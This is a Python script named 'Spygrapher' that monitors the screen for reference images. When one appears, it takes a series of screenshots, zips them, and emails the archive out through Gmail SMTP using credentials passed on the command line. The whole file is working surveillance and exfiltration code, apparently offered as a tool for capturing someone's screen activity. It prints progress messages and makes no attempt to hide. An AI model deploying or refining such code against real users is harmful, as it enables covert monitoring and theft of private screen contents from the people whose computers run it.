import time, os, sys
import pyautogui, pyscreeze
import zipfile
import smtplib
import argparse
import threading
from socket import gaierror
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

#TODO: Add Threading

class Directories(object):
	__slots__ = ['current' ,'find', 'screenshots', 'compressed']
	def __init__(self):
		self.current = os.path.dirname(os.path.realpath(__file__))
		self.find = os.path.join(self.current, 'find')
		self.screenshots = os.path.join(self.current, 'screenshots')
		self.compressed = os.path.join(self.current, 'compressed')

def getCurrentDateTime():
	current_date_time = time.localtime()
	formatted_time = time.strftime('%Y%m%d-%H%M%S', current_date_time)
	return formatted_time

def deleteFrom(folder):
	if folder == 'screenshots':
		for file in os.listdir(dir.screenshots):
			if file.endswith('.png'):
				os.remove(os.path.join(dir.screenshots, file))
	elif folder == 'compressed':
		for file in os.listdir(dir.compressed):
			if file.endswith('.zip'):
				os.remove(os.path.join(dir.compressed, file))

def sendMail(zip_name, server, user_email, user_password, receiving_email):
	tLock.acquire()
	email_from = user_email
	email_password = user_password
	email_to = receiving_email

	subject = 'Spygrapher - ' + getCurrentDateTime()

	mail = MIMEMultipart() # Creating the mail object
	mail['From'] = email_from
	mail['To'] = email_to
	mail['Subject'] = subject

	body = 'Spygrapher reporting!'
	mail.attach(MIMEText(body,'plain')) # Attaching body text to mail object

	file_dir = os.path.join(dir.compressed, zip_name) # Loading file
	attachment = open(file_dir, 'rb') # Reading file

	att = MIMEBase('application', 'octet-stream') # Creating encoder object
	att.set_payload(attachment.read()) # Attaching file to the encoder
	encoders.encode_base64(att) # Setting the encoder to base 64
	att.add_header('Content-Disposition', "attachment; filename = " + file_dir) # Adding file to header

	mail.attach(att) # Attaching encoder with file to mail
	text = mail.as_string() # Getting the text content from the mail as a string

	server.sendmail(email_from, email_to, text) # Sending mail
	attachment.close() # Closing file
	print('Deleting compressed file')
	deleteFrom('compressed')
	tLock.release()

def createZip():
	date_time = getCurrentDateTime()
	zip_name = 'images_' + date_time + '.zip'
	zip_file = zipfile.ZipFile(os.path.join(dir.compressed, zip_name), mode='w', compression=zipfile.ZIP_DEFLATED)
	for file in os.listdir(dir.screenshots):
		if file.endswith('.png'):
			zip_file.write(os.path.join(dir.screenshots, file))
	zip_file.close()
	return zip_name

def takeScreenshots(amount, interval):
	for i in range(0, amount):
		date_time = getCurrentDateTime()
		screenshot_name = 'image' + str(i + 1) + '_' + date_time + '.png'
		pyautogui.screenshot(os.path.join(dir.screenshots, screenshot_name))
		time.sleep(interval)

def checkFindImages():
	return [file for file in os.listdir(dir.find) if file.endswith('.png')]		

def checkFolders():
	if not os.path.exists(dir.find):
		os.mkdir('find')
	if not os.path.exists(dir.screenshots):
		os.mkdir('screenshots')
	if not os.path.exists(dir.compressed):
		os.mkdir('compressed')

def getArguments():
	parser = argparse.ArgumentParser(description="Email info parser")
	parser.add_argument('-u' ,'--user_email', help="Email sender account", type=str)
	parser.add_argument('-p' ,'--user_password', help="Password of the email sender account", type=str)
	parser.add_argument('-r' ,'--receiving_email', help="Email receiving account (it can be the same as the sender)", type=str)
	parser.add_argument('-o', '--offlineMode', help='Disable the email part of the script so -u, -p and -r are not required', action='store_true')

	args = parser.parse_args()

	return args.user_email, args.user_password, args.receiving_email, args.offlineMode

def startServerConnection():
	try:
		print("Starting server connection")
		server = smtplib.SMTP('smtp.gmail.com', 587) # Initializing gmail server connection (if you're not using gmail then search your mail's provider smtp server and port)
		server.ehlo_or_helo_if_needed() # Annoucing connection
		server.starttls() # Starting secure connection
		print("Logging in")
		server.login(user_email, user_password) # Logging into user account
		print("Logged!")
		return server
	except smtplib.SMTPAuthenticationError:
		print('Error: Cannot login into the user account.')
		print("This may occur because the email and password does not match a existing account or the 'allow less-secure apps' option of your gmail account is disabled.")
		server.quit()
		sys.exit()
	except AttributeError:
		print('No user email, user password and/or receiver email was given.')
		print('By default the script needs those argument to send the images via email.')
		print("If you don't want to send them via email use the -o | --offlineMode argument (-h for help).")
		server.quit()
		sys.exit()
	except gaierror:
		print("\nCant reach server address.")
		sys.exit()

if __name__ == '__main__':

	amount, interval = 10, 2 # takeScreenshots arguments
	user_email , user_password, receiving_email, offlineMode = getArguments()

	if not offlineMode:
		server = startServerConnection()

	dir = Directories()
	i = 0
	find_images = []

	checkFolders()

	print('Searching...\n')
	while True:
		try:
			if find_images != checkFindImages():
				find_images = checkFindImages()
				print('New images have been added or substracted from the find folder.\n')
				time.sleep(1)
				print('Searching...\n')
			i = i % len(find_images)
			pyautogui.locateOnScreen(os.path.join(dir.find, find_images[i]), confidence = 0.85)
			print('Image found!')
			print('Taking screenshots, this process will take ' + str(amount*interval) + ' seconds')
			takeScreenshots(amount, interval)
			print('Creating compressed file')
			zip_name = createZip()
			print('Deleting screenshots')
			deleteFrom('screenshots')
			if not offlineMode:
				print('Sending Email, this process will take about 7 seconds')
				tLock = threading.Lock()
				emailThread = threading.Thread(target=sendMail, args=(zip_name, server, user_email, user_password, receiving_email))
				emailThread.start()
			print('\nSearching...\n')
		except pyscreeze.ImageNotFoundException:
			time.sleep(0.5)
			i += 1
		except ZeroDivisionError:
			print('Error: The find folder does not containg any image to look for.')
			print('Please insert at least one .png in the find folder. The folder has been created in the same directory as this script.')
			while len(find_images) == 0:
				time.sleep(2)
				find_images = checkFindImages()
			print('\n' + str(len(find_images)) + ' image/s found!\n')
			print('Searching...\n')
		except OSError:
			print('Error: The software does not have permission to load the image or it has an unsupported name.')
			print('Accents are not supported.\n')
			break
	if not offlineMode:
		server.quit()